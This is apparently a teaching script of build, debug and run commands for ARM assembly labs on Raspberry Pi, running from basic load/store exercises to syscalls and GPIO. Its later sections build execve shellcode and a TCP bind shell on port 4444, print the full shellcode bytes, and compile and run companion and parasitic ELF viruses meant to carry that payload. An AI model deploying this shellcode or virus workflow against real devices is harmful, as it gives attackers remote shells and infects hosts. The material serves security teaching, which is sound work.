#########################################################################################
# if not real RPi board: https://azeria-labs.com/emulate-raspberry-pi-with-qemu/ | https://interrupt.memfault.com/blog/emulating-raspberry-pi-in-qemu
# 
# for Dockerized Qemu: 
# Make sure you have Docker installed in Windows 10/11 - on MacOS and Linux is easier:
# 1. Turn Windows features on or off - FULL Hyper-V & Windows Hypervisor Platform
# 2. Command line:
wsl.exe --set-version Ubuntu 2
wsl --set-default-version 2
# Make sure that it is listing Ubuntu version 2 and it is RUNNING:
wsl -l -v
# 3. Reinstall Docker Engine (optional):
# Apps & Features - Uninstall Docker, then install again.
# https://desktop.docker.com/win/main/amd64/Docker%20Desktop%20Installer.exe
# - in Downloads - double click and Next (Use WSL2 instead of Hyper-V) => Docker 4.24.0 installed
# 4. In settings of Docker GUI
# Resources -> WSL Integration - check enable integration and turn (updated) Ubuntu ON => Apply & Restart
# (Optional) RESTART MACHINE!!!
# https://interrupt.memfault.com/blog/emulating-raspberry-pi-in-qemu | https://github.com/memfault/interrupt/blob/master/example/emulating-raspberry-pi-in-qemu/Dockerfile
# https://hub.docker.com/r/stawiski/qemu-raspberrypi-3b | docker pull stawiski/qemu-raspberrypi-3b | docker pull stawiski/qemu-raspberrypi-3b:2023-05-03-raspios-bullseye-arm64
#
#########################################################################################
# Examples for ARM Assembly 32 bits and 64 bits
#
# 
# https://azeria-labs.com/azm/ | https://azm.azerialabs.com/
# https://azeria-labs.com/emulate-raspberry-pi-with-qemu/
# https://azeria-labs.com/writing-arm-assembly-part-1/ | https://thinkingeek.com/2013/01/19/arm-assembler-raspberry-pi-chapter-5/
# https://azeria-labs.com/writing-arm-shellcode/ | https://github.com/azeria-labs/ARM-assembly-examples
# https://github.com/Apress/Raspberry-Pi-Assembly-Language-Programming
# https://github.com/Apress/programming-with-64-bit-ARM-assembly-language
#
# Install GEF as plugin for GDB
# https://github.com/hugsy/gef
# wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py
# mv ~/.gdbinit ~/.gdbinit.original
# echo source ~/.gdbinit-gef.py >> ~/.gdbinit

# ----------------
# * Load/Store example:
# cd ~/workspacearmassembly/arm32/p01_ldr_str
# as -o p02ls.o p02ls.s
# ld -o p02ls.elf32 p02ls.o
# or (ld is used for label "_start" and gcc for label "main" in the link-editing phase)
# gcc -o p02ls.elf32 p02ls.o
# or directly:
# gcc -o p02ls.elf32 p02ls.s

# in gef> ... :
# gdb -q ./p02ls
# disassemble _start
# br _start
# run
# x/2w $pc
# x/2w $pc+12
# nexti 1
# x/2w $pc+12
# nexti 1
# nexti 1
# x/w 0x10090

# x/2xw 0x21024
# x/8xb 0x21024

# stepi
# quit
# ---------------------
# alternative to gef is the latest gdb in Raspbian OS year 2023:
# besides the standard gdb commands => gdb help:
# br main
# run
# tui enable
# layout split
# layout regs
# focus asm
# stepi 1, x/8xb 0x21024, etc....
# tui disable
### --------

#########################################################################################
## Examples of development and debugging of ARM Assembly on Raspberry Pi 3:
#########################################################################################

cd ~/workspacearmassembly/

# This is for arm32
cd arm32

# -------------------------------------------------------
# 1. Intro and Data Types - simple load and store 
# for "main" label use gcc and for "_start" use ld as link-editor
# in gdb session use: a) break main / break _start ; b) run ; c) steps / next ; d) x/1xw $pc ; e) quit

cd p01_ldr_str
mkdir out

as p01dt.s -o out/p01dt.o
ld -o out/p01dt.elf32 out/p01dt.o
# gdb out/p01dt.elf32

as p02ls.s -o out/p02ls.o
gcc -o out/p02ls.elf32 out/p02ls.o
# gdb out/p02ls.elf32

as p03l.s -o out/p03l.o
gcc -o out/p03l.elf32 out/p03l.o
# gdb out/p03l.elf32

as p04s.s -o out/p04s.o
gcc -o out/p04s.elf32 out/p04s.o
# gdb out/p04s.elf32

rm -rf out
cd .. 

# -------------------------------------------------------
# 2. Pre-, Post- indexed and Offset address mode for load and store 

cd p02_ldr_str_pre_post
mkdir out

as p05ldrstrprepost.s -o out/p05ldrstrprepost.o
gcc -o out/p05ldrstrprepost.elf32 out/p05ldrstrprepost.o
# gdb out/p05ldrstrprepost.elf32

rm -rf out
cd .. 


# -------------------------------------------------------
# 3. Multiple ldm/stm - load and store incl. barrel shifter

cd p03_multi_ldr_str_psh_pop
mkdir out

as p06multildrstr.s -o out/p06multildrstr.o
ld -o out/p06multildrstr.elf32 out/p06multildrstr.o
# gdb out/p06multildrstr.elf32

as p07pshpop.s -o out/p07pshpop.o
ld -o out/p07pshpop.elf32 out/p07pshpop.o
# gdb out/p07pshpop.elf32

rm -rf out
cd .. 

# -------------------------------------------------------
# 4. Conditional execution

cd p04_condexec
mkdir out

as p08condexec.s -o out/p08condexec.o
gcc -o out/p08condexec.elf32 out/p08condexec.o
# gdb out/p08condexec.elf32

rm -rf out
cd .. 


# -------------------------------------------------------
# 5. Branches, Conditional execution control flow structures - if, for; Thumb mode

cd p05_branches_condctrlflow_thumb
mkdir out

as p09_b.s -o out/p09_b.o
gcc -o out/p09_b.elf32 out/p09_b.o
# gdb out/p09_b.elf32

as p10_bc.s -o out/p10_bc.o
gcc -o out/p10_bc.elf32 out/p10_bc.o
# gdb out/p10_bc.elf32

as p11_if.s -o out/p11_if.o
gcc -o out/p11_if.elf32 out/p11_if.o
# gdb out/p11_if.elf32

as p12_loop.s -o out/p12_loop.o
gcc -o out/p12_loop.elf32 out/p12_loop.o
# gdb out/p12_loop.elf32

as p13_loop.s -o out/p13_loop.o
gcc -o out/p13_loop.elf32 out/p13_loop.o
# gdb out/p13_loop.elf32

as p14_arr.s -o out/p14_arr.o
gcc -o out/p14_arr.elf32 out/p14_arr.o
# gdb out/p14_arr.elf32

as p15_bx_thumb.s -o out/p15_bx_thumb.o
gcc -o out/p15_bx_thumb.elf32 out/p15_bx_thumb.o
# gdb out/p15_bx_thumb.elf32

as p16_condexecthumb.s -o out/p16_condexecthumb.o
gcc -o out/p16_condexecthumb.elf32 out/p16_condexecthumb.o
# gdb out/p16_condexecthumb.elf32

rm -rf out
cd .. 


# -------------------------------------------------------
# 6. The stack and the functions

cd p06_stack_fcn
mkdir out

as p17_bcond_fcn.s -o out/p17_bcond_fcn.o
gcc -o out/p17_bcond_fcn.elf32 out/p17_bcond_fcn.o
# gdb out/p17_bcond_fcn.elf32

as p18_stack.s -o out/p18_stack.o
gcc -o out/p18_stack.elf32 out/p18_stack.o
# gdb out/p18_stack.elf32

as p19_fcn_max.s -o out/p19_fcn_max.o
gcc -o out/p19_fcn_max.elf32 out/p19_fcn_max.o
# gdb out/p19_fcn_max.elf32

as p20_fcn_recurr.s -o out/p20_fcn_recurr.o
gcc -o out/p20_fcn_recurr.elf32 out/p20_fcn_recurr.o
# gdb out/p20_fcn_recurr.elf32

rm -rf out
cd .. 


# -------------------------------------------------------
# 7. Software interrupts / IRQ / Linux sys calls (System Calls)

cd p07_interrupts
mkdir out


as p21_fcn_puts_a_hello.s -o out/p21_fcn_puts_a_hello.o
gcc -o out/p21_fcn_puts_a_hello.elf32 out/p21_fcn_puts_a_hello.o
# ./out/p21_fcn_puts_a_hello.elf32
# gdb out/p21_fcn_puts_a_hello.elf32


gcc -o out/p21_fcn_puts_c_hello.elf32 p21_fcn_puts_c_hello.c
# ./out/p21_fcn_puts_c_hello.elf32
# strace -f -v ./out/p21_fcn_puts_c_hello.elf32

# Linux man page and the params for "puts" are here: https://www.man7.org/linux/man-pages/man2/write.2.html
# #include <unistd.h>
# ssize_t write(int fd, const void *buf, size_t count); => fd (#1 - stdout) -> r0; *buf -> r1; count -> r2 and sys call constant 4 in r7
# grep write /usr/include/arm-linux-gnueabihf/asm/unistd-common.h 
# for RPi3 with 2023 Raspian OS from May: nano /usr/include/arm-linux-gnueabihf/asm/unistd-oabi.h 

# => ... #define __NR_write (__NR_SYSCALL_BASE + 4)
# ARM sys call constant is 4 for the "write" function
# confirmation here: https://marcin.juszkiewicz.com.pl/download/tables/syscalls.html

# keep in mind the fan params and sys call constant 4
# => create a syscall in ARM Assembly with 11 in r7 and then SWI / SVC 0/1
# ssize_t write(int fd, const void *buf, size_t count); 
# => fd (#1 - stdout) -> r0; *buf -> r1; count -> r2 and sys call constant 4 in r7


# => p22_svc_irq_hello.s


as p22_svc_irq_hello.s -o out/p22_svc_irq_hello.o
gcc -o out/p22_svc_irq_hello.elf32 out/p22_svc_irq_hello.o
# ./out/p22_svc_irq_hello.elf32

# in one ssh window: ssh stud@aimctoma.go.ro 7722 # run gdb:
# gdb out/p22_svc_irq_hello.elf32
# break main
# run > gdb1.txt

# in another ssh window: ssh stud@aimctoma.go.ro 7722 # run tail:
# stud@raspberrypi3:~/asmarm/test $ tail -f gdb1.txt

rm -rf out
cd .. 


# -------------------------------------------------------
# 8. Macro-definitions calling Linux sys calls (System Calls) for printing on the screen/display

cd p08_string_macro
mkdir out

as uppermacro.s -o out/uppermacro.o
as mainmacro.s -o out/mainmacro.o

gcc -o out/mainmacro.elf32 out/uppermacro.o out/mainmacro.o

# ./out/mainmacro.elf32
# gdb out/mainmacro.elf32


gcc -o out/u4.elf32 uppertst4_callasm_from_clangcode.c
# ./out/u4.elf32
# gdb out/u4.elf32

rm -rf out
cd .. 


# -------------------------------------------------------
# 9. Linux sys calls (System Calls) for files

cd p09_syscalls_file
mkdir out

as fileio.s -o out/fileio.o
as errno.s -o out/errno.o
as unistd.s -o out/unistd.o
as main.s -o out/main.o
ld out/errno.o out/unistd.o out/fileio.o out/main.o -o out/main_files.elf32
# rm output.txt
# ./out/main_files.elf32
# gdb out/main_files.elf32 


rm -rf out
cd .. 


# -------------------------------------------------------
# 10. Linux sys calls (System Calls) for GPIO - LED blinking - in Linux (eMbedded) "everything - SPI, UART, GPIO, etc. is file"

cd p10_syscalls_gpio
mkdir out

as unistd.s -o out/unistd.o
as fileio.s -o out/fileio.o
as gpiomacros.s -o out/gpiomacros.o
as main.s -o out/main.o
ld out/unistd.o out/fileio.o out/gpiomacros.o out/main.o -o out/main_gpio_blink_led.elf32
# ./out/main_gpio_blink_led.elf32
# gdb out/main_gpio_blink_led.elf32 


rm -rf out
cd .. 


# -------------------------------------------------------
# 11. Linux sys calls (System Calls) for shell code and socket for opening TCP connections by hackers of the IoT GW
# https://azeria-labs.com/writing-arm-shellcode/ | https://github.com/azeria-labs/ARM-assembly-examples 
# https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/

cd p11_shellcode_syscalls_sock
mkdir out

gcc -o system.elf32 system.c
strace -f -v ./out/system.elf32
grep execve /usr/include/arm-linux-gnueabihf/asm/unistd-common.h 
# #define __NR_execve (__NR_SYSCALL_BASE+ 11)
# int  execve(const char *filename, char *const argv [], char *const envp[]);
# => create a syscall in ARM Assembly with 11 in r7 and then SWI / SVC 0/1

as execve1.s -o out/execve1.o
objdump -d out/execve1.o


# => DE-NULLIFYING SHELLCODE

as execve2.s -o out/execve2.o
objdump -d out/execve2.o

as execve3.s -o out/execve3.o && ld -N out/execve3.o -o out/execve3.elf32
./out/execve3.elf32

objcopy -O binary out/execve3.elf32 out/execve3.bin 
hexdump -v -e '"\\""x" 1/1 "%02x" ""' out/execve3.bin 



# https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/
# STAGE ONE: SYSTEM FUNCTIONS AND THEIR PARAMETERS

cat /usr/include/arm-linux-gnueabihf/asm/unistd-common.h | grep socket
# cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep socket
# =>
# #define __NR_socketcall             (__NR_SYSCALL_BASE+102)
# #define __NR_socket                 (__NR_SYSCALL_BASE+281)
# #define __NR_bind      (__NR_SYSCALL_BASE+282)
# #define __NR_listen    (__NR_SYSCALL_BASE+284)
# #define __NR_accept    (__NR_SYSCALL_BASE+285)
# #define __NR_dup2      (__NR_SYSCALL_BASE+ 63)
# #define __NR_execve    (__NR_SYSCALL_BASE+ 11)
# http://man7.org/linux/man-pages/index.html

gcc bind_test.c -o out/bind_test.elf32
strace -e execve,socket,bind,listen,accept,dup2 ./out/bind_test.elf32
netstat -tlpn

# netcat -nv 0.0.0.0 4444
netcat -nv 192.168.1.100 4444

as bind_shell.s -o out/bind_shell.o && ld -N out/bind_shell.o -o out/bind_shell.elf32
./out/bind_shell.elf32
# check from the local RPi 3
netcat -vv 0.0.0.0 4444
# check from remote RPi 4
netcat -vv 192.168.1.100 4444
uname -a 
whoami
pwd


objcopy -O binary out/bind_shell.elf32 out/bind_shell.bin
hexdump -v -e '"\\""x" 1/1 "%02x" ""' out/bind_shell.bin

hexdump -v -e '"0""x" 1/1 "%02x, " ""' out/bind_shell.bin

# 0x01, 0x30, 0x8f, 0xe2, 0x13, 0xff, 0x2f, 0xe1, 0x02, 0x20, 0x01, 0x21, 0x92, 0x1a, 0xc8, 0x27, 0x51, 0x37, 0x01, 0xdf, 0x04, 0x1c, 0x12, 0xa1, 0x4a, 0x70, 0x0a, 0x71, 0x4a, 0x71, 0x8a, 0x71, 0xca, 0x71, 0x10, 0x22, 0x01, 0x37, 0x01, 0xdf, 0xc0, 0x46, 0x20, 0x1c, 0x02, 0x21, 0x02, 0x37, 0x01, 0xdf, 0x20, 0x1c, 0x49, 0x1a, 0x92, 0x1a, 0x01, 0x37, 0x01, 0xdf, 0x04, 0x1c, 0x3f, 0x27, 0x20, 0x1c, 0x49, 0x1a, 0x01, 0xdf, 0x20, 0x1c, 0x01, 0x31, 0x01, 0xdf, 0x20, 0x1c, 0x01, 0x31, 0x01, 0xdf, 0x05, 0xa0, 0x49, 0x40, 0x52, 0x40, 0xc2, 0x71, 0x0b, 0x27, 0x01, 0xdf, 0xc0, 0x46, 0x02, 0xff, 0x11, 0x5c, 0x00, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x58
# see https://stackoverflow.com/questions/9960721/how-to-get-c-code-to-execute-hex-machine-code
# for running x86/ARM machine code directly from C language at runtime ;)
# go with this machine code in the virus

# TP-Link router is configured with wire connections with 192.168.1.100 IPv4 for RPi3 and 192.168.1.101 IPv4 for RPi4
# run this on RPi 3
gcc -z execstack -o out/run_hex_machinecode.elf32 run_hex_machinecode.c
./out/run_hex_machinecode.elf32

# run this on RPi 4 in the same time
netcat -vv 192.168.1.100 4444


rm -rf out
cd .. 


# -------------------------------------------------------
# 12. Standard Companion X21/X23 virus and an ELF 32/64 bits parasitic virus may contain for the malicious code section
# the hex machine code from step #11 as char* for the business logic direct or reverse shell-code malware


cd p12_virus_malware4IoTGwNodes/vir_companion
mkdir out

gcc -o out/ahost_svc_irq_hello001.elf32 ../hosts/ahost_svc_irq_hello001.s
gcc -o out/ahost_svc_irq_hello002.elf32 ../hosts/ahost_svc_irq_hello002.s
gcc -o out/ahost_svc_irq_hello003.elf32 ../hosts/ahost_svc_irq_hello003.s
gcc -o out/ahost_svc_irq_hello004.elf32 ../hosts/ahost_svc_irq_hello004.c

gcc -o out/X21 X21.c
ls -l out
./out/ahost_svc_irq_hello001.elf32
./out/ahost_svc_irq_hello004.elf32

cd out
ls -l 
./X21
ls -l 
./ahost_svc_irq_hello001.elf32
./ahost_svc_irq_hello004.elf32
ls -l
rm -rf *
cd ..

### ----

gcc -o out/ahost_svc_irq_hello001.elf32 ../hosts/ahost_svc_irq_hello001.s
gcc -o out/ahost_svc_irq_hello002.elf32 ../hosts/ahost_svc_irq_hello002.s
gcc -o out/ahost_svc_irq_hello003.elf32 ../hosts/ahost_svc_irq_hello003.s
gcc -o out/ahost_svc_irq_hello004.elf32 ../hosts/ahost_svc_irq_hello004.c

# check macrodef / constant for the virus size from the virus in conjuction with ls -l out
gcc -o out/X23 X23.c
ls -l out
./out/ahost_svc_irq_hello001.elf32
#./out/ahost_svc_irq_hello004.elf32

cd out
ls -l 
./X23
ls -l 
./ahost_svc_irq_hello001.elf32
./ahost_svc_irq_hello004.elf32
ls -l
rm -rf *
cd ..

rm -rf out
cd ../.. 

# --------------------


cd p12_virus_malware4IoTGwNodes/vir_parasitic
mkdir out

gcc -o out/ahost_svc_irq_hello001.elf32 ../hosts/ahost_svc_irq_hello001.s
gcc -o out/ahost_svc_irq_hello002.elf32 ../hosts/ahost_svc_irq_hello002.s
gcc -o out/ahost_svc_irq_hello003.elf32 ../hosts/ahost_svc_irq_hello003.s
gcc -o out/ahost_svc_irq_hello004.elf32 ../hosts/ahost_svc_irq_hello004.c

# check macrodef / constant for the virus size from the virus in conjuction with ls -l out
gcc -o out/virus.elf32 virus.c
cd out
./virus.elf32
cd ..

# check the syscalls from dir.c for searching files in ARM assembly by using syscalls

rm -rf out
cd ../.. 

### -----------------------

cd ..

#########################################################################################



#########################################################################################
# This is for arm64
cd arm64

# -------------------------------------------------------
# 7. Software interrupts / IRQ / Linux sys calls (System Calls)

cd p07_interrupts
mkdir out

gcc -o out/atest.elf64 atest.s
# gdb out/atest.elf64


# Not working yet
# https://cit.dixie.edu/cs/2810/arm64-assembly.html
### as p21_fcn_puts_a_hello.s -o out/p21_fcn_puts_a_hello.o
### gcc -o out/p21_fcn_puts_a_hello.elf64 out/p21_fcn_puts_a_hello.o
# ./out/p21_fcn_puts_a_hello.elf64
# gdb out/p21_fcn_puts_a_hello.elf64



gcc -o out/p21_fcn_puts_c_hello.elf64 p21_fcn_puts_c_hello.c
# ./out/p21_fcn_puts_c_hello.elf64
# strace -f -v ./out/p21_fcn_puts_c_hello.elf64

# Linux man page and the params for "puts" are here: https://www.man7.org/linux/man-pages/man2/write.2.html
# #include <unistd.h>
# ssize_t write(int fd, const void *buf, size_t count); => fd (#1 - stdout) -> x0; *buf -> x1; count -> x2 
# and sys call constant 64 in X8 which has to have the Linux service command
# grep write /usr/include/asm-generic/unistd.h 
# pi@raspberrypi:~/workspace_arm_assembly/arm64/p07_interrupts $ grep write /usr/include/asm-generic/unistd.h 
# => ...
# /* fs/read_write.c */
# #define __NR_write 64
# __SYSCALL(__NR_write, sys_write)

# ARM sys call constant is 64 for the "write" function
# confirmation here for 64 bits: https://marcin.juszkiewicz.com.pl/download/tables/syscalls.html

# keep in mind the fcn params and sys call constant 64
# => create a syscall in ARM Assembly with 64 in X8 and then SVC 0/1
# ssize_t write(int fd, const void *buf, size_t count); 
# => fd (#1 - stdout) -> X0; *buf -> X1; count -> X2 and sys call constant 64 in X8


# => p22_svc_irq_hello.s


as p22_svc_irq_hello.s -o out/p22_svc_irq_hello.o
gcc -o out/p22_svc_irq_hello.elf64 out/p22_svc_irq_hello.o
# ./out/p22_svc_irq_hello.elf64
# gdb out/p22_svc_irq_hello.elf64


rm -rf out
cd .. 

# -------------------------------------------------------

cd ..

#########################################################################################

# For Android Studio project which uses NDK for calling ARM Assembly 32/64 bits from Kotlin -> C, 
# please see readme text file from its own folder. 

#########################################################################################

